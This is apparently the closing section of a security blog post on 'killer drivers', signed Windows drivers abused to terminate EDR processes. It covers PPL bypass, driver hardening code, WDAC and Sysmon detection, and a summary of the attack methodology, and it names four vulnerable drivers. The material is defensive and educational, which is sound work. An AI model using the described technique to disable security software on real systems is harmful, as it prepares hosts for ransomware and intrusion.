The existence of killer drivers is not merely an academic concern. In real-world incidents, BYOVD-based EDR killing is an established pre-ransomware tactic: attackers use a vulnerable driver to terminate security processes before detonating their payload. Understanding the defensive landscape is as important as understanding the offensive technique.
 
### Why Unrestricted Process Termination Is Dangerous
 
The fundamental design flaw in every killer driver analyzed above is identical: **the ability to call `ZwTerminateProcess` on any arbitrary PID with no validation**. The consequences span three categories:
 
**Critical System Process Termination:**
 
Processes like `csrss.exe` (Client Server Runtime), `wininit.exe`, `winlogon.exe`, and `smss.exe` are not just security tools — they are load-bearing components of the Windows session management architecture. Terminating `csrss.exe` causes an immediate system crash (Bug Check) because the kernel treats its termination as fatal. Terminating `lsass.exe` triggers an automatic system reboot. Killer drivers that expose unguarded `ZwTerminateProcess` can inadvertently — or deliberately — cause denial-of-service at the OS level.
 
**Security Process Termination:**
 
EDR agents, antivirus engines, and security monitoring tools rely on their processes remaining running and their kernel components loaded. A killer driver provides a kernel-mode mechanism to circumvent the user-mode protections these tools implement: restricted process handles, process name obfuscation, watchdog restart processes. Once terminated from kernel mode, many security products have no recovery path — their watchdogs are typically user-mode processes that can themselves be killed.
 
**Privilege Boundary Bypass:**
 
From user mode, terminating a process running as SYSTEM requires `SeDebugPrivilege` — a privilege not normally held by standard users or even non-elevated administrators. Via a vulnerable driver, any user with device access (potentially a standard user, depending on device ACLs) can terminate SYSTEM processes. This is a privilege escalation vector entirely independent of the EDR-killing use case.
 
### Protected Process Light (PPL)
 
Microsoft introduced **Protected Process Light** in Windows 8.1 as a direct response to the threat of security process tampering. PPL elevates a process to a protected state by associating it with a **protection level** encoded in the process's `_EPROCESS.Protection` field in the kernel.
 
A process's protection level determines which access rights callers can request when opening a handle, whether code injection is permitted, and whether handles with termination rights are granted. PPL levels are hierarchical:
 
| Level | Type | Used By |
|-------|------|---------|
| `WinTcb` | `Protected` | Core Windows TCB components |
| `WinSystem` | `Protected` | Windows system services |
| `Antimalware` | `Protected Light` | Security software (AV/EDR registered via ELAM) |
| `Lsa` | `Protected Light` | LSASS in protected mode |
| `CodeGen` | `Protected Light` | Code generation processes |
| `None` | `None` | Standard processes |
 
A process at `Antimalware` PPL can only be terminated by a caller running at a higher PPL level or by kernel code with specific access. This prevents even SYSTEM-privileged user-mode code from opening a termination handle.
 
**The PPL bypass via killer drivers:**
 
Here is the critical vulnerability: `ZwTerminateProcess` called from **kernel mode** with a kernel-obtained handle bypasses PPL restrictions entirely. PPL is enforced by the kernel's object manager when `ZwOpenProcess` is called from **user mode**. But a driver that calls `ZwOpenProcess` internally — from kernel context — can obtain a `PROCESS_TERMINATE` handle to any process regardless of its PPL level.
 
This is why the absence of PPL validation in killer drivers is not a minor oversight. A security vendor might register their EDR process as `Antimalware` PPL and believe it is protected from arbitrary termination. A killer driver bypasses this by never involving the user-mode access check path.
 
A properly designed driver that exposes process termination capability should implement an explicit PPL check before calling `ZwTerminateProcess`:
 
```c
// Example PPL check before terminating
PEPROCESS pProcess;
PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)targetPid, &pProcess);
 
// Read the Protection field from EPROCESS
// Offset must be resolved dynamically per Windows build version
PS_PROTECTION protection = GetProcessProtection(pProcess);
 
if (protection.Type != PsProtectedTypeNone) {
    ObDereferenceObject(pProcess);
    return STATUS_ACCESS_DENIED;  // Refuse to terminate any PPL/PP process
}
```
 
None of the four drivers analyzed implement any check resembling this.
 
### Design Recommendations for Driver Developers
 
For third-party driver developers shipping kernel components that expose process manipulation capabilities, the following practices should be standard requirements, not optional hardening:
 
**Input Validation on IOCTL Handlers:**
 
Every IOCTL handler that acts on a PID should validate the input buffer before using it:
 
```c
// Validate input buffer is the expected size
if (inputBufferLength < sizeof(DWORD)) {
    Irp->IoStatus.Status = STATUS_BUFFER_TOO_SMALL;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_BUFFER_TOO_SMALL;
}
 
// Windows PIDs are always multiples of 4; reject obviously invalid values
DWORD pid = *(DWORD*)inputBuffer;
if (pid == 0 || pid == 4 || (pid % 4 != 0)) {
    return STATUS_INVALID_PARAMETER;
}
```
 
**Process Whitelist/Blacklist Enforcement:**
 
Maintain a hardcoded list of process names that should never be terminated, including all critical Windows infrastructure:
 
```c
static const WCHAR* PROTECTED_PROCESS_NAMES[] = {
    L"csrss.exe",    L"wininit.exe",   L"winlogon.exe",
    L"smss.exe",     L"lsass.exe",     L"services.exe",
    L"svchost.exe",  L"System",        NULL
};
 
BOOLEAN IsSystemCriticalProcess(PEPROCESS pProcess) {
    PUNICODE_STRING imageName = NULL;
    if (NT_SUCCESS(SeLocateProcessImageName(pProcess, &imageName))) {
        for (int i = 0; PROTECTED_PROCESS_NAMES[i] != NULL; i++) {
            if (wcsstr(imageName->Buffer, PROTECTED_PROCESS_NAMES[i])) {
                ExFreePool(imageName);
                return TRUE;
            }
        }
        ExFreePool(imageName);
    }
    return FALSE;
}
```
 
**PPL Awareness:**
 
Before invoking `ZwTerminateProcess`, query the target process's protection level:
 
```c
PS_PROTECTION* pProtection =
    (PS_PROTECTION*)((ULONG_PTR)pProcess + g_EprocessProtectionOffset);
 
if (pProtection->Type != PsProtectedTypeNone) {
    return STATUS_ACCESS_DENIED;
}
```
 
Note that `g_EprocessProtectionOffset` varies between Windows build versions and must be resolved dynamically using pattern scanning or a version-indexed offset table.
 
**Device Object Access Control:**
 
Restrict which users can open the device in the first place. Using `IoCreateDeviceSecure` with a restrictive SDDL security descriptor ensures that even if an attacker knows the device name, they cannot obtain a handle without sufficient privileges:
 
```c
// SDDL: Only SYSTEM (SY) and built-in Administrators (BA) can open the device
UNICODE_STRING sddl = RTL_CONSTANT_STRING(L"D:P(A;;GA;;;SY)(A;;GA;;;BA)");
 
IoCreateDeviceSecure(
    DriverObject, 0,
    &deviceName,
    FILE_DEVICE_UNKNOWN,
    FILE_DEVICE_SECURE_OPEN,
    FALSE,
    &sddl,
    &DEVICE_CLASS_GUID,
    &pDeviceObject
);
```
 
### Detecting BYOVD at Runtime
 
For defenders building detection capabilities against BYOVD and killer driver attacks:
 
**WDAC Driver Blocklisting:**
 
Windows Defender Application Control supports kernel driver policies. A WDAC policy that maintains a deny-list of known-vulnerable driver hashes (sourced from loldrivers.io) provides the strongest preventive control:
 
```powershell
# Generate a WDAC policy denying a specific driver by hash
$driverHash = "SHA256:abcdef1234567890..."  # From loldrivers.io entry
New-CIPolicy -Level Hash -Deny `
    -DriverFiles @("C:\analysis\truesight.sys") `
    -FilePath "C:\Policies\DenyKillerDrivers.xml"
ConvertFrom-CIPolicy `
    -XmlFilePath "C:\Policies\DenyKillerDrivers.xml" `
    -BinaryFilePath "C:\Policies\DenyKillerDrivers.p7b"
```
 
Microsoft also maintains an official vulnerable driver blocklist that can be applied via WDAC and is enforced automatically when HVCI (Memory Integrity) is enabled.
 
**ETW-Based Detection:**
 
Monitor `Microsoft-Windows-Kernel-Process` (image load events, EventID 5) for image loads matching known-vulnerable driver hashes. Cross-reference against loldrivers.io in your SIEM. Sysmon Event ID 6 (driver load) also captures this with hash information.
 
```powershell
# Sysmon rule concept:
# Event ID 6 (Driver Loaded)
# Condition: Signed = true AND Hash IN (loldrivers.io hash list)
# Action: Alert — legitimate signature on a known-vulnerable driver
```
 
This catches BYOVD even for legitimately signed drivers because the detection is hash-based, not certificate-based.
 
**Behavioral Correlation — Security Process Termination:**
 
A high-fidelity behavioral indicator for killer driver abuse:
 
1. A process sends `DeviceIoControl` to a kernel driver device (`IRP_MJ_DEVICE_CONTROL` event)
2. Within seconds, one or more security-related processes terminate (Security EventID 4689)
3. The terminating process cannot be the EDR itself (since it is being killed)
 
Correlating these events in a SIEM with a short time window produces a near-zero false-positive detection for BYOVD-based EDR killing.
 
**Driver Signature Temporal Validation:**
 
Many BYOVD drivers were signed before their certificates were revoked. Validate not just signature validity but temporal plausibility:
 
```powershell
Get-AuthenticodeSignature "suspicious.sys" | ForEach-Object {
    $cert = $_.SignerCertificate
    [PSCustomObject]@{
        Status          = $_.Status
        CertExpiry      = $cert.NotAfter
        IsExpired       = ($cert.NotAfter -lt (Get-Date))
        Thumbprint      = $cert.Thumbprint
        SubjectName     = $cert.SubjectName.Name
    }
}
```
 
A driver loaded with an expired certificate on a modern system indicates either HVCI is disabled or an older Windows version without strict revocation enforcement — both conditions worth flagging.
 
---
 
## Conclusion
 
Killer drivers represent a fascinating and persistently relevant attack surface at the intersection of kernel internals, vulnerability research, and operational security tradecraft. The technique is straightforward in concept — find a legitimately signed driver that exposes kernel process termination without validation, load it, send the right IOCTL — but the reverse engineering skills required to discover and weaponize new variants span a meaningful depth of technical knowledge: PE analysis, IDA navigation, Windows kernel internals, API call chain tracing, and controlled exploit validation.
 
The four drivers analyzed here — TrueSight, Ksapi64, TfSysmon, and Viragt64 — all share the same fundamental vulnerability: `ZwTerminateProcess` exposed through a user-reachable IOCTL with no PPL checking, no process whitelist, and no meaningful access control. That this pattern repeats across drivers from different vendors, different time periods, and different use cases speaks to how rarely driver security receives serious design consideration during development. Exposing kernel power through an IOCTL is easy to implement; implementing it safely requires understanding the security boundaries the kernel provides and deliberately respecting them.
 
The key takeaways from this post:
 
**The methodology is consistent.** Six phases — entry point analysis, device creation identification, import hunting, cross-reference chain traversal, IOCTL identification, and PoC construction — apply to virtually every killer driver you will encounter. The variations (inline vs. nested initialization, hex vs. decimal vs. negative-integer IOCTL representations, direct vs. chained kill calls) are surface-level differences on a consistent underlying pattern. Build the methodology into muscle memory and unfamiliar drivers become readable within minutes.
 
**PPL is not a silver bullet.** Protected Process Light provides strong user-mode protection against security software tampering. A kernel-mode caller with a vulnerable driver bypasses it entirely because the protection enforcement point is in the user-mode access check path. Defense in depth — WDAC driver policies, HVCI, ETW telemetry, and behavioral detection — is required to compensate for this gap.
 
**Practice volume compounds.** Working through a dozen killer drivers from loldrivers.io builds pattern recognition that transfers directly to unknown samples. The goal is to reach a point where you can identify the IOCTL dispatch handler, the kill chain, and the triggering IOCTL value within minutes of loading an unfamiliar binary — not hours.
 
**The detection surface is real and usable.** Image load events, behavioral correlations between device control calls and security process termination, and WDAC hash-based blocklists all provide viable detection opportunities. Defenders who understand the attack technique can instrument their environments specifically and precisely against it.
 
The persistence of vulnerable drivers in the wild — years after public disclosure, valid signatures on revoked certificates, binaries still circulating in malware toolkits and loldriver catalogs — ensures that BYOVD and killer driver techniques will remain relevant attack primitives for the foreseeable future. The gap between the power kernel drivers wield and the security discipline with which that power is exposed is large, and adversaries will continue to exploit it until it closes.
 
### Further Reading and References
 
- **loldrivers.io** — Community database of living-off-the-land drivers with hashes, abuse techniques, and detection rules
- **Windows Internals 7th Edition, Part 1** — Chapter on the I/O System and driver architecture
- **Pavel Yosifovich — "Windows Kernel Programming"** — Comprehensive kernel driver development reference
- **Alex Ionescu — "Protected Processes"** — Foundational research on PPL architecture, levels, and bypass implications
- **Sektor7 Institute — "Malware Development Intermediate"** — Covers driver-based EDR killing in practical depth
- **Microsoft WDAC Documentation** — `docs.microsoft.com/windows/security/threat-protection/windows-defender-application-control`
- **Microsoft Vulnerable Driver Blocklist** — `docs.microsoft.com/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules`
- **RobbinHood Ransomware Analysis (Sophos)** — Documented use of `gdrv.sys` for EDR killing pre-encryption
- **Lazarus POORTRY Campaign (Microsoft/Mandiant)** — Nation-state BYOVD analysis with TTPs
- **BlackByte Ransomware (Symantec)** — BYOVD using `RTCore64.sys` for defensive bypass
- **OSR Online (osronline.com)** — Technical reference and community for Windows driver development
- **WDK Documentation** — `docs.microsoft.com/windows-hardware/drivers/kernel` — Official kernel API reference
- **ioctl.ly** — Online IOCTL decoder tool for quick CTL_CODE decomposition
